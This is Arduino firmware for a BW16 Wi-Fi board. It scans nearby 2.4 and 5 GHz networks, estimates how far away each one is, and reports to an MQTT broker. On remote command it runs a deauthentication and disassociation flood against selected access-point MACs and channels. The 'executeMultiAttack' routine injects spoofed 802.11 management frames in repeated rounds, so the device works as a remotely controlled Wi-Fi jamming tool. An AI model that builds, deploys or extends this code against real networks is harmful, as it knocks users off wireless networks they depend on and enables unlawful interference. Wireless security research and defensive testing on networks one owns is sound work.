#undef max

#include <ArduinoJson.h>
#include <PubSubClient.h>
#include <WiFi.h>
#include <WiFiSSLClient.h>
#include <math.h>
#include <vector>

#include "wifi_conf.h"
#include "wifi_structures.h"
#include "sys_api.h"
#include "bw16_commands.h"
#include "bw16_config.h"
#include "src/packet-injection/packet-injection.h"
#include "wifi_manager_attack.h"

namespace {
constexpr uint16_t MQTT_PACKET_BUFFER_SIZE = 16384;
constexpr unsigned long WIFI_CONNECT_TIMEOUT_MS = 30000;
constexpr unsigned long WIFI_RETRY_INTERVAL_MS = 10000;
constexpr unsigned long MQTT_RETRY_INTERVAL_MS = 5000;
constexpr unsigned long MIN_STATUS_INTERVAL_MS = 30000;
constexpr unsigned long MAX_STATUS_INTERVAL_MS = 3600000;
constexpr unsigned long SCAN_TIMEOUT_MS = 15000;
WiFiManagerAttack wifiAttack;

struct WiFiScanResult {
  String ssid;
  String bssid;
  short rssi;
  uint8_t channel;
};

std::vector<WiFiScanResult> scanResults;
volatile bool scanComplete = false;

WiFiSSLClient wifiClient;
PubSubClient mqtt(wifiClient);

unsigned long lastWiFiAttempt = 0;
unsigned long wifiAttemptStarted = 0;
unsigned long lastMqttAttempt = 0;
unsigned long lastStatus = 0;
unsigned long statusIntervalMs = MIN_STATUS_INTERVAL_MS;
bool wifiAttemptActive = false;
bool scanRequested = false;
bool scanResultsPending = false;

// Forward declaration inside the namespace
void executeMultiAttack(const Bw16Command &cmd);

String sanitizeSsid(const String &ssid) {
  String clean = ssid;
  for (unsigned int i = 0; i < clean.length(); i++) {
    const unsigned char c = static_cast<unsigned char>(clean[i]);
    if (c < 32 || c > 126) clean[i] = '?';
  }
  return clean;
}

float estimateDistance(short rssi) {
  constexpr float measuredPower = -45.0f;
  constexpr float pathLossExponent = 2.7f;
  return powf(10.0f, (measuredPower - rssi) / (10.0f * pathLossExponent));
}

String localIpString() {
  const IPAddress ip = WiFi.localIP();
  char value[16];
  snprintf(value, sizeof(value), "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
  return String(value);
}

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scanResult) {
  if (scanResult->scan_complete != 0) {
    scanComplete = true;
    return RTW_SUCCESS;
  }

  rtw_scan_result_t *record = &scanResult->ap_details;
  const size_t ssidLength = min(static_cast<size_t>(record->SSID.len),
                                sizeof(record->SSID.val) - 1);
  record->SSID.val[ssidLength] = 0;

  char bssid[18];
  snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
           record->BSSID.octet[0], record->BSSID.octet[1],
           record->BSSID.octet[2], record->BSSID.octet[3],
           record->BSSID.octet[4], record->BSSID.octet[5]);

  WiFiScanResult result;
  result.ssid = String(reinterpret_cast<const char *>(record->SSID.val));
  result.bssid = bssid;
  result.rssi = record->signal_strength;
  result.channel = record->channel;
  scanResults.push_back(result);
  return RTW_SUCCESS;
}

bool scanNetworks() {
  Serial.println("Scanning 2.4 GHz and 5 GHz networks...");
  scanResults.clear();
  scanComplete = false;

  if (wifi_scan_networks(scanResultHandler, nullptr) != RTW_SUCCESS) {
    Serial.println("WiFi scan could not be started");
    return false;
  }

  const unsigned long started = millis();
  while (!scanComplete && millis() - started < SCAN_TIMEOUT_MS) {
    mqtt.loop();
    delay(10);
  }

  Serial.print("Networks found: ");
  Serial.println(scanResults.size());
  return scanComplete;
}

void publishStatus(const char *status) {
  if (!mqtt.connected()) return;

  JsonDocument doc;
  doc["device"] = DEVICE_ID;
  doc["status"] = status;
  doc["mode"] = "scanner";
  doc["hardware"] = "BW16";
  doc["bands"] = "2.4GHz,5GHz";
  doc["uptime"] = millis() / 1000;
  doc["rssi"] = WiFi.RSSI();
  doc["ip"] = localIpString();

  String json;
  serializeJson(doc, json);
  mqtt.publish(TOPIC_STATUS, json.c_str());
}

bool publishScanResults() {
  if (!mqtt.connected()) return false;

  JsonDocument doc;
  doc["device"] = DEVICE_ID;
  doc["type"] = "scan_results";
  doc["timestamp"] = millis();

  JsonArray networks = doc["networks"].to<JsonArray>();
  for (const WiFiScanResult &network : scanResults) {
    JsonObject item = networks.add<JsonObject>();
    item["ssid"] = sanitizeSsid(network.ssid);
    item["bssid"] = network.bssid;
    item["channel"] = network.channel;
    item["rssi"] = network.rssi;
    item["distance"] = roundf(estimateDistance(network.rssi) * 10.0f) / 10.0f;
    item["is_target"] = false;
    item["band"] = network.channel <= 14 ? "2.4GHz" : "5GHz";
  }
  doc["total_networks"] = scanResults.size();

  if (doc.overflowed() || measureJson(doc) + strlen(TOPIC_SCAN) + 8 > MQTT_PACKET_BUFFER_SIZE) {
    mqtt.publish(TOPIC_STATUS,
                 "{\"status\":\"scan_payload_too_large\",\"device\":\"" DEVICE_ID "\"}");
    Serial.println("Scan payload exceeded the 16 KB JSON capacity");
    return true;
  }

  String json;
  serializeJson(doc, json);
  Serial.print("Scan payload bytes: ");
  Serial.print(json.length());
  Serial.print(" / ");
  Serial.println(MQTT_PACKET_BUFFER_SIZE);
  const bool published = mqtt.publish(TOPIC_SCAN, json.c_str());
  Serial.println(published ? "Scan results published" : "Scan publish failed");
  return published;
}

void handleCommand(char *topic, byte *payload, unsigned int length) {
  String command;
  command.reserve(length);
  for (unsigned int i = 0; i < length; i++) command += static_cast<char>(payload[i]);
  command.trim();

  const Bw16Command parsed = parseBw16Command(command);
  if (parsed.type == Bw16CommandType::Empty) return;

  Serial.print("MQTT command: ");
  Serial.println(command);

  if (parsed.type == Bw16CommandType::Scan) {
    publishStatus("scanning");
    scanRequested = true;
  } else if (parsed.type == Bw16CommandType::Status) {
    publishStatus("standby");
  } else if (parsed.type == Bw16CommandType::Restart) {
    publishStatus("restarting");
    mqtt.loop();
    delay(250);
    sys_reset();
  } else if (parsed.type == Bw16CommandType::Stop) {
    // Scanner firmware has no active radio operation to stop.
    publishStatus("stopped");
    publishStatus("standby");
  } else if (parsed.type == Bw16CommandType::SetInterval) {
    if (parsed.intervalMs >= MIN_STATUS_INTERVAL_MS &&
        parsed.intervalMs <= MAX_STATUS_INTERVAL_MS) {
      statusIntervalMs = parsed.intervalMs;
      JsonDocument doc;
      doc["device"] = DEVICE_ID;
      doc["status"] = "interval_updated";
      doc["interval"] = statusIntervalMs;
      String json;
      serializeJson(doc, json);
      mqtt.publish(TOPIC_STATUS, json.c_str());
    } else {
      publishStatus("invalid_interval");
    }
  } else if (parsed.type == Bw16CommandType::MultiAttack) {
    // Disconnect MQTT before packet injection
    if (mqtt.connected()) {
      mqtt.disconnect();
      delay(100);
    }
    
    executeMultiAttack(parsed);
    
    // Reset connection state machines after attack
    wifiAttemptActive = false;
    lastWiFiAttempt = millis() - WIFI_RETRY_INTERVAL_MS;
    lastMqttAttempt = millis() - MQTT_RETRY_INTERVAL_MS;

  } else {
    Serial.print("Unsupported command: ");
    Serial.println(command);
    publishStatus("unsupported_command");
  }

  if (String(topic) == TOPIC_CMD_RETAINED) {
    mqtt.publish(TOPIC_CMD_RETAINED, "", true);
  }
}

void executeMultiAttack(const Bw16Command &cmd) {
  // Validate channel
  if (cmd.channel < 1 || cmd.channel > 165) {
    Serial.println("Invalid channel");
    publishStatus("invalid_channel");
    return;
  }
  
  // Check if we have a valid MAC address
  bool hasMac = false;
  for (int i = 0; i < 6; i++) {
    if (cmd.targetMac[i] != 0) {
      hasMac = true;
      break;
    }
  }
  
  if (!hasMac) {
    Serial.println("Invalid target MAC");
    publishStatus("invalid_target");
    return;
  }
  
  Serial.print("Starting deauth attack on SSID: ");
  Serial.println(cmd.targetSsid);
  
  // Publish attack status
  JsonDocument doc;
  doc["device"] = DEVICE_ID;
  doc["status"] = "attacking";
  doc["target_ssid"] = cmd.targetSsid;
  doc["target_channel"] = cmd.channel;
  doc["attack_count"] = cmd.attackCount;
  doc["reason_code"] = 5;
  doc["band"] = cmd.channel <= 14 ? "2.4GHz" : "5GHz";
  String json;
  serializeJson(doc, json);
  mqtt.publish(TOPIC_STATUS, json.c_str());
  
  // Initialize radio for attack
  wifiAttack.begin();
  
  // Set the channel
  if (!wifiAttack.setChannel(cmd.channel)) {
    Serial.println("Failed to set channel for attack");
    publishStatus("channel_set_failed");
    wifiAttack.end();
    return;
  }
  
  // Create local non-const copies for the packet injection
  uint8_t targetMac[6];
  memcpy(targetMac, cmd.targetMac, 6);
  uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  
  // If multiple targets, iterate through them
  if (cmd.targets.size() > 0) {
    // Multiple targets
    for (const auto &target : cmd.targets) {
      uint8_t targetMacLocal[6];
      memcpy(targetMacLocal, target.mac, 6);
      
      // Set channel for this target
      if (!wifiAttack.setChannel(target.channel)) {
        Serial.print("Failed to set channel for target: ");
        Serial.println(target.ssid);
        continue;
      }
      
      Serial.print("Attacking target: ");
      Serial.println(target.ssid);
      
      // Perform the attack on this target
      for (uint8_t i = 0; i < cmd.attackCount; i++) {
        // Send deauth frames (reason code 5 - disassociated due to inactivity)
        wifi_tx_deauth_frame(targetMacLocal, broadcastMac, 0x05);
        delay(50);
        wifi_tx_deauth_frame(broadcastMac, targetMacLocal, 0x05);
        delay(30);
        
        // Send disassociation frames (reason code 5)
        wifi_tx_disassoc_frame(targetMacLocal, broadcastMac, 0x05);
        delay(50);
        wifi_tx_disassoc_frame(broadcastMac, targetMacLocal, 0x05);
        delay(30);
        
        Serial.print("Packet set ");
        Serial.print(i + 1);
        Serial.print("/");
        Serial.println(cmd.attackCount);
        
        // Small delay to prevent overwhelming the radio
        if (i % 5 == 4) {
          delay(100);
        }
      }
    }
  } else {
    // Single target
    for (uint8_t i = 0; i < cmd.attackCount; i++) {
      // Send deauth frames (reason code 5)
      wifi_tx_deauth_frame(targetMac, broadcastMac, 0x05);
      delay(50);
      wifi_tx_deauth_frame(broadcastMac, targetMac, 0x05);
      delay(30);
      
      // Send disassociation frames (reason code 5)
      wifi_tx_disassoc_frame(targetMac, broadcastMac, 0x05);
      delay(50);
      wifi_tx_disassoc_frame(broadcastMac, targetMac, 0x05);
      delay(30);
      
      Serial.print("Packet set ");
      Serial.print(i + 1);
      Serial.print("/");
      Serial.println(cmd.attackCount);
      
      // Small delay to prevent overwhelming the radio
      if (i % 5 == 4) {
        delay(100);
      }
    }
  }
  
  // Restore normal WiFi operation
  wifiAttack.end();
  
  // Force reconnection to MQTT WiFi
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  
  Serial.println("Attack complete");
  publishStatus("attack_complete");
  delay(500);
  publishStatus("standby");
}


void connectWiFi() {
  const uint8_t status = WiFi.status();
  if (status == WL_CONNECTED) {
    if (wifiAttemptActive) {
      wifiAttemptActive = false;
      Serial.print("WiFi connected. IP: ");
      Serial.println(localIpString());
    }
    return;
  }

  if (wifiAttemptActive) {
    if (millis() - wifiAttemptStarted < WIFI_CONNECT_TIMEOUT_MS) return;

    Serial.print("WiFi connection timed out (status=");
    Serial.print(status);
    Serial.println("). Check the password and WPA2 compatibility.");
    WiFi.disconnect();
    wifiAttemptActive = false;
    lastWiFiAttempt = millis();
    return;
  }

  if (millis() - lastWiFiAttempt < WIFI_RETRY_INTERVAL_MS) return;

  lastWiFiAttempt = millis();
  wifiAttemptStarted = millis();
  wifiAttemptActive = true;
  Serial.print("Connecting to WiFi: ");
  Serial.println(WIFI_SSID);
  const int beginStatus = WiFi.begin(WIFI_SSID, WIFI_PASS);
  if (beginStatus == WL_CONNECT_FAILED) {
    Serial.println("WiFi.begin rejected the connection immediately.");
    WiFi.disconnect();
    wifiAttemptActive = false;
  }
}

void connectMqtt() {
  if (WiFi.status() != WL_CONNECTED || mqtt.connected()) return;
  if (millis() - lastMqttAttempt < MQTT_RETRY_INTERVAL_MS) return;

  lastMqttAttempt = millis();
  const String clientId = String("bw16-") + DEVICE_ID + "-" + String(millis(), HEX);
  Serial.print("Connecting to MQTT...");

  if (!mqtt.connect(clientId.c_str(), MQTT_USER, MQTT_PASS)) {
    Serial.print(" failed, rc=");
    Serial.println(mqtt.state());
    return;
  }

  Serial.println(" connected");
  mqtt.subscribe(TOPIC_CMD);
  mqtt.subscribe(TOPIC_CMD_RETAINED);
  mqtt.subscribe(TOPIC_BROADCAST);
  mqtt.publish(TOPIC_CMD_RETAINED, "", true);
  publishStatus("online");
}
}  // namespace

// Add to your BW16.ino file
extern "C" {
  #include "wifi_conf.h"
  #include "wifi_structures.h"
}

bool setWiFiChannel(uint16_t channel) {
  Serial.print("Setting WiFi channel to: ");
  Serial.println(channel);
  
  // For RTL8720DN, try different methods to set channel
  // Method 1: Try wifi_set_channel
  extern int wifi_set_channel(int channel);
  if (wifi_set_channel(channel) == 0) {
    Serial.println("Channel set successfully via wifi_set_channel");
    return true;
  }
  
  // Method 2: Try wext_set_channel
  extern int wext_set_channel(const char *ifname, int channel);
  if (wext_set_channel("wlan0", channel) == 0) {
    Serial.println("Channel set successfully via wext_set_channel");
    return true;
  }
  
  // Method 3: Try rtw_set_channel
  extern int rtw_set_channel(int channel);
  if (rtw_set_channel(channel) == 0) {
    Serial.println("Channel set successfully via rtw_set_channel");
    return true;
  }
  
  Serial.println("Failed to set channel");
  return false;
}


void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("BW16 MQTT dual-band scanner starting");

  mqtt.setServer(MQTT_BROKER, MQTT_PORT);
  mqtt.setCallback(handleCommand);
  mqtt.setKeepAlive(30);
  mqtt.setBufferSize(MQTT_PACKET_BUFFER_SIZE);

  // A null root CA matches the ESP32 firmware's current insecure TLS mode.
  // Set MQTT_ROOT_CA in bw16_secrets.h to enable server certificate validation.
#ifdef MQTT_ROOT_CA
  wifiClient.setRootCA(reinterpret_cast<unsigned char *>(const_cast<char *>(MQTT_ROOT_CA)));
#endif

  lastWiFiAttempt = millis() - WIFI_RETRY_INTERVAL_MS;
  connectWiFi();
}

void loop() {
  if (scanRequested) {
    scanRequested = false;

    // The RTL8720DN scan operation invalidates the active TLS socket even
    // when the station keeps its IP address. Close MQTT first so connected()
    // cannot report a stale socket after the scan.
    if (mqtt.connected()) {
      mqtt.disconnect();
      delay(100);
    }

    scanResultsPending = scanNetworks();

    // AmebaD scanning can drop the station socket. Force both connection
    // state machines to observe and restore their links before publishing.
    wifiAttemptActive = false;
    lastWiFiAttempt = millis() - WIFI_RETRY_INTERVAL_MS;
    lastMqttAttempt = millis() - MQTT_RETRY_INTERVAL_MS;
  }

  connectWiFi();
  connectMqtt();

  if (mqtt.connected()) {
    mqtt.loop();
    if (scanResultsPending) {
      if (publishScanResults()) {
        scanResultsPending = false;
        publishStatus("standby");
      } else {
        mqtt.disconnect();
      }
    }
    if (millis() - lastStatus >= statusIntervalMs) {
      lastStatus = millis();
      publishStatus("standby");
    }
  }

  delay(10);
}